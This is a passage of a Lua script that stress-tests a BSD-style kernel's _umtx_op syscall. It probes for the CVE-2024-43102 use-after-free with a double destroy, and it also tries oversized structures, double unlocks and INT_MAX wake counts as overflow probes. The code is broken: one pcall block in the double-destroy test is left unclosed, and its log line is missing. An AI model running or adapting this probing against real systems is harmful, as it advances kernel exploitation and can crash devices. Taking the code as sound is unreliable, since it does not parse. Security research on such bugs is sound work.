local UMTX_OP_NWAKE_PRIVATE = 21
local UMTX_OP_MUTEX_WAKE2 = 22
local UMTX_OP_SEM2_WAIT  = 23
local UMTX_OP_SEM2_WAKE  = 24
local UMTX_OP_SHM        = 25
local UMTX_OP_ROBUST_LISTS = 26

-- Get our thread ID
local tid_buf = memory.alloc(8)
pcall(function() syscall.sc_thr_self(tid_buf) end)
local tid = memory.read_dword(tid_buf):tonumber()
log("tid: " .. tid)

-- ============================================================
-- STRESS 1: UMTX_OP_SHM — the CVE-2024-43102 family
-- This op creates/destroys shared memory keys tied to umtx.
-- The original bug was a race between SHM create and destroy.
-- Even single-threaded, we can stress the alloc/free path.
-- ============================================================
log("")
log("--- STRESS 1: UMTX_OP_SHM alloc/free churn ---")

-- UMTX_SHM_CREAT=1, UMTX_SHM_LOOKUP=2, UMTX_SHM_DESTROY=4, UMTX_SHM_ALIVE=8
local UMTX_SHM_CREAT   = 1
local UMTX_SHM_LOOKUP  = 2
local UMTX_SHM_DESTROY = 4
local UMTX_SHM_ALIVE   = 8

local shm_key = memory.alloc(256)
memory.write_dword(shm_key, 0x41414141)

local shm_results = { create_ok = 0, create_fail = 0, lookup_ok = 0,
    destroy_ok = 0, alive_ok = 0 }

-- Create, lookup, alive, destroy cycle
for round = 1, 100 do
    -- Create
    local ok1, r1 = pcall(function()
        return syscall.sc_umtx_op(shm_key, UMTX_OP_SHM, UMTX_SHM_CREAT, 0, 0, 0)
    end)
    if ok1 then
        local rv = r1:tonumber()
        if rv >= 0 then
            shm_results.create_ok = shm_results.create_ok + 1
        else
            shm_results.create_fail = shm_results.create_fail + 1
        end
    else
        shm_results.create_fail = shm_results.create_fail + 1
    end

    -- Lookup
    local ok2 = pcall(function()
        return syscall.sc_umtx_op(shm_key, UMTX_OP_SHM, UMTX_SHM_LOOKUP, 0, 0, 0)
    end)
    if ok2 then shm_results.lookup_ok = shm_results.lookup_ok + 1 end

    -- Alive check
    local ok3 = pcall(function()
        return syscall.sc_umtx_op(shm_key, UMTX_OP_SHM, UMTX_SHM_ALIVE, 0, 0, 0)
    end)
    if ok3 then shm_results.alive_ok = shm_results.alive_ok + 1 end

    -- Destroy
    local ok4 = pcall(function()
        return syscall.sc_umtx_op(shm_key, UMTX_OP_SHM, UMTX_SHM_DESTROY, 0, 0, 0)
    end)
    if ok4 then shm_results.destroy_ok = shm_results.destroy_ok + 1 end
end

log("  100 rounds: create=" .. shm_results.create_ok ..
    " lookup=" .. shm_results.lookup_ok ..
    " alive=" .. shm_results.alive_ok ..
    " destroy=" .. shm_results.destroy_ok ..
    " create_fail=" .. shm_results.create_fail)

-- Rapid create without destroy (resource exhaustion / leak test)
log("")
log("  rapid create without destroy...")
local create_count = 0
for i = 1, 200 do
    local key = memory.alloc(8)
    memory.write_dword(key, 0x42420000 + i)
    local ok = pcall(function()
        return syscall.sc_umtx_op(key, UMTX_OP_SHM, UMTX_SHM_CREAT, 0, 0, 0)
    end)
    if ok then create_count = create_count + 1 end
end
log("  created " .. create_count .. "/200 SHM keys without destroy")

-- Double destroy (UAF probe)
log("")
log("  double-destroy test...")
local dd_key = memory.alloc(8)
memory.write_dword(dd_key, 0xDEAD0001)
pcall(function() syscall.sc_umtx_op(dd_key, UMTX_OP_SHM, UMTX_SHM_CREAT, 0, 0, 0) end)
local dd1_ok, dd1_err = pcall(function()
    return syscall.sc_umtx_op(dd_key, UMTX_OP_SHM, UMTX_SHM_DESTROY, 0, 0, 0)

local dd2_ok, dd2_err = pcall(function()
    return syscall.sc_umtx_op(dd_key, UMTX_OP_SHM, UMTX_SHM_DESTROY, 0, 0, 0)
end)
log("  destroy 2: " .. (dd2_ok and "OK" or tostring(dd2_err):sub(1,40)))
-- Lookup after double destroy
local dd3_ok, dd3_err = pcall(function()
    return syscall.sc_umtx_op(dd_key, UMTX_OP_SHM, UMTX_SHM_LOOKUP, 0, 0, 0)
end)
log("  lookup after dd: " .. (dd3_ok and "OK(!)" or tostring(dd3_err):sub(1,40)))

-- ============================================================
-- STRESS 2: UMTX_OP_ROBUST_LISTS
-- This registers a list of mutexes to clean up on thread exit.
-- Passing crafted pointers probes kernel's handling of userspace
-- memory references in the robust list path.
-- ============================================================
log("")
log("--- STRESS 2: UMTX_OP_ROBUST_LISTS ---")

-- struct umtx_robust_lists_params { size, robust_list_offset, robust_inact_offset }
local robust_params = memory.alloc(64)

-- Test 1: register with valid-looking structure
memory.write_qword(robust_params, 24)  -- size = sizeof(struct)
local dummy_list = memory.alloc(4096)
memory.write_qword(dummy_list, 0)  -- head = NULL (empty list)
memory.write_qword(robust_params + 8, dummy_list)  -- robust_list_offset
memory.write_qword(robust_params + 16, 0)          -- robust_inact_offset

local rob_ok, rob_err = pcall(function()
    return syscall.sc_umtx_op(robust_params, UMTX_OP_ROBUST_LISTS, 24, 0, 0, 0)
end)
log("  register robust list: " .. (rob_ok and "OK" or tostring(rob_err):sub(1,50)))

-- Test 2: register with oversized struct (bounds check)
memory.write_qword(robust_params, 4096)
local rob2_ok, rob2_err = pcall(function()
    return syscall.sc_umtx_op(robust_params, UMTX_OP_ROBUST_LISTS, 4096, 0, 0, 0)
end)
log("  oversized robust: " .. (rob2_ok and "ACCEPTED(!)" or tostring(rob2_err):sub(1,50)))

-- Test 3: register with zero size
memory.write_qword(robust_params, 0)
local rob3_ok, rob3_err = pcall(function()
    return syscall.sc_umtx_op(robust_params, UMTX_OP_ROBUST_LISTS, 0, 0, 0, 0)
end)
log("  zero-size robust: " .. (rob3_ok and "ACCEPTED" or tostring(rob3_err):sub(1,50)))

-- Test 4: register then re-register (double register)
memory.write_qword(robust_params, 24)
memory.write_qword(robust_params + 8, dummy_list)
pcall(function() syscall.sc_umtx_op(robust_params, UMTX_OP_ROBUST_LISTS, 24, 0, 0, 0) end)
local new_list = memory.alloc(4096)
memory.write_qword(new_list, 0)
memory.write_qword(robust_params + 8, new_list)
local rob4_ok = pcall(function()
    return syscall.sc_umtx_op(robust_params, UMTX_OP_ROBUST_LISTS, 24, 0, 0, 0)
end)
log("  double-register: " .. (rob4_ok and "OK (re-register works)" or "REJECTED"))

-- ============================================================
-- STRESS 3: WAIT_UINT_PRIVATE with timeout=0 (non-blocking)
-- Tests the umtx wait path without actually blocking.
-- The val argument is compared to *addr — if they match,
-- the thread blocks. We set them to not match so it returns.
-- ============================================================
log("")
log("--- STRESS 3: WAIT/WAKE churn ---")

local wait_addr = memory.alloc(256)
memory.write_dword(wait_addr, 0)

-- Timespec for immediate timeout
local ts = memory.alloc(16)
memory.write_qword(ts, 0)
memory.write_qword(ts + 8, 1) -- 1 nanosecond

local wait_ok = 0
local wait_timeout = 0
local wait_err_count = 0

for i = 1, 500 do
    -- Set value to i so it won't match val=0 => immediate return
    memory.write_dword(wait_addr, i)

    local ok, err = pcall(function()
        return syscall.sc_umtx_op(wait_addr, UMTX_OP_WAIT_UINT_PRIVATE, 0, 0, ts, 0)
    end)
    if ok then
        wait_ok = wait_ok + 1
    else
        local es = tostring(err)
        if es:find("ETIMEDOUT") or es:find("EWOULDBLOCK") then
            wait_timeout = wait_timeout + 1
        else
            wait_err_count = wait_err_count + 1
        end
    end

    -- Wake (should be no-op since nobody is waiting)
    pcall(function()
        syscall.sc_umtx_op(wait_addr, UMTX_OP_WAKE_PRIVATE, 1, 0, 0, 0)
    end)
end
log("  500 wait/wake: ok=" .. wait_ok .. " timeout=" .. wait_timeout .. " err=" .. wait_err_count)

-- ============================================================
-- STRESS 4: MUTEX operations — trylock/unlock without owner
-- Tests the kernel's mutex state machine for logic errors
-- ============================================================
log("")
log("--- STRESS 4: mutex state machine ---")

-- umutex structure: volatile lwpid_t m_owner (4 bytes) + uint32_t m_flags (4) + ...
local umutex = memory.alloc(256)
memory.write_dword(umutex, 0)     -- m_owner = unowned
memory.write_dword(umutex + 4, 0) -- m_flags = 0
memory.write_dword(umutex + 8, 0) -- m_ceilings[0]
memory.write_dword(umutex + 12, 0) -- m_ceilings[1]
memory.write_dword(umutex + 16, 0) -- m_rb_lnk

-- Trylock (should succeed since unowned)
local tl_ok, tl_err = pcall(function()
    return syscall.sc_umtx_op(umutex, UMTX_OP_MUTEX_TRYLOCK, 0, 0, 0, 0)
end)
local owner_after_lock = memory.read_dword(umutex):tonumber()
log("  trylock: " .. (tl_ok and "OK" or tostring(tl_err):sub(1,30)) .. " owner=" .. owner_after_lock)

-- Unlock
local ul_ok, ul_err = pcall(function()
    return syscall.sc_umtx_op(umutex, UMTX_OP_MUTEX_UNLOCK, 0, 0, 0, 0)
end)
local owner_after_unlock = memory.read_dword(umutex):tonumber()
log("  unlock: " .. (ul_ok and "OK" or tostring(ul_err):sub(1,30)) .. " owner=" .. owner_after_unlock)

-- Double unlock (logic error probe)
local ul2_ok, ul2_err = pcall(function()
    return syscall.sc_umtx_op(umutex, UMTX_OP_MUTEX_UNLOCK, 0, 0, 0, 0)
end)
log("  double unlock: " .. (ul2_ok and "OK(!)" or tostring(ul2_err):sub(1,30)))

-- Lock with UMTX_OP_MUTEX_WAIT then immediately wake
memory.write_dword(umutex, tid) -- pretend we own it
local mw_ok = pcall(function()
    return syscall.sc_umtx_op(umutex, UMTX_OP_MUTEX_WAKE, 0, 0, 0, 0)
end)
log("  wake owned mutex: " .. (mw_ok and "OK" or "FAIL"))

-- MUTEX_WAKE2 with flags
memory.write_dword(umutex, 0) -- unowned
local mw2_ok = pcall(function()
    return syscall.sc_umtx_op(umutex, UMTX_OP_MUTEX_WAKE2, 0, 0, 0, 0)
end)
log("  wake2 unowned: " .. (mw2_ok and "OK" or "FAIL"))

-- Rapid lock/unlock churn
local churn_ok = 0
for i = 1, 200 do
    memory.write_dword(umutex, 0)
    local ok1 = pcall(function()
        syscall.sc_umtx_op(umutex, UMTX_OP_MUTEX_TRYLOCK, 0, 0, 0, 0)
    end)
    local ok2 = pcall(function()
        syscall.sc_umtx_op(umutex, UMTX_OP_MUTEX_UNLOCK, 0, 0, 0, 0)
    end)
    if ok1 and ok2 then churn_ok = churn_ok + 1 end
end
log("  200 lock/unlock rounds: " .. churn_ok .. " ok")

-- ============================================================
-- STRESS 5: SEM2 wait/wake (semaphore v2)
-- ============================================================
log("")
log("--- STRESS 5: SEM2 churn ---")

-- _usem2 structure: volatile uint32_t _count (4) + uint32_t _flags (4)
local usem2 = memory.alloc(256)
memory.write_dword(usem2, 1)     -- _count = 1 (available)
memory.write_dword(usem2 + 4, 0) -- _flags = 0

-- Wake (post)
local sem_ok = 0
for i = 1, 100 do
    memory.write_dword(usem2, 0) -- count=0
    local ok = pcall(function()
        syscall.sc_umtx_op(usem2, UMTX_OP_SEM2_WAKE, 0, 0, 0, 0)
    end)
    if ok then sem_ok = sem_ok + 1 end
end
log("  100 SEM2_WAKE: " .. sem_ok .. " ok")

-- ============================================================
-- STRESS 6: NWAKE_PRIVATE (wake N addresses at once)
-- The kernel iterates a userspace array of pointers.
-- Boundary testing: what if the array is huge or misaligned?
-- ============================================================
log("")
log("--- STRESS 6: NWAKE_PRIVATE ---")

-- Normal: array of 4 addresses to wake
local wake_array = memory.alloc(256)
local addr1 = memory.alloc(16)
local addr2 = memory.alloc(16)
local addr3 = memory.alloc(16)
local addr4 = memory.alloc(16)
memory.write_qword(wake_array, addr1)
memory.write_qword(wake_array + 8, addr2)
memory.write_qword(wake_array + 16, addr3)
memory.write_qword(wake_array + 24, addr4)

local nw_ok, nw_err = pcall(function()
    return syscall.sc_umtx_op(wake_array, UMTX_OP_NWAKE_PRIVATE, 4, 0, 0, 0)
end)
log("  nwake 4 addrs: " .. (nw_ok and "OK" or tostring(nw_err):sub(1,40)))

-- Large count (kernel reads count*8 bytes from userspace)
local nw2_ok, nw2_err = pcall(function()
    return syscall.sc_umtx_op(wake_array, UMTX_OP_NWAKE_PRIVATE, 1000, 0, 0, 0)
end)
log("  nwake 1000 count: " .. (nw2_ok and "OK(!)" or tostring(nw2_err):sub(1,40)))

-- Zero count
local nw3_ok = pcall(function()
    return syscall.sc_umtx_op(wake_array, UMTX_OP_NWAKE_PRIVATE, 0, 0, 0, 0)
end)
log("  nwake 0 count: " .. (nw3_ok and "OK" or "FAIL"))

-- Huge count (integer overflow probe)
local nw4_ok, nw4_err = pcall(function()
    return syscall.sc_umtx_op(wake_array, UMTX_OP_NWAKE_PRIVATE, 0x7FFFFFFF, 0, 0, 0)
end)
log("  nwake INT_MAX: " .. (nw4_ok and "OK(!)" or tostring(nw4_err):sub(1,40)))

-- ============================================================
-- STRESS 7: CV (condition variable) signal without waiters
-- ============================================================
log("")
log("--- STRESS 7: CV signal/broadcast ---")

local ucond = memory.alloc(256)
memory.write_dword(ucond, 0) -- c_has_waiters
memory.write_dword(ucond + 4, 0) -- c_flags
memory.write_dword(ucond + 8, 0) -- c_clockid

local cv_sig_ok = 0
local cv_bcast_ok = 0
for i = 1, 100 do
    local ok1 = pcall(function()
        syscall.sc_umtx_op(ucond, UMTX_OP_CV_SIGNAL, 0, 0, 0, 0)
    end)
    local ok2 = pcall(function()
        syscall.sc_umtx_op(ucond, UMTX_OP_CV_BROADCAST, 0, 0, 0, 0)
    end)
    if ok1 then cv_sig_ok = cv_sig_ok + 1 end
    if ok2 then cv_bcast_ok = cv_bcast_ok + 1 end
end
log("  100 rounds: signal=" .. cv_sig_ok .. " broadcast=" .. cv_bcast_ok)

log("")
log("=== UMTX STRESS DONE ===")
return table.concat(out, "\n")
```
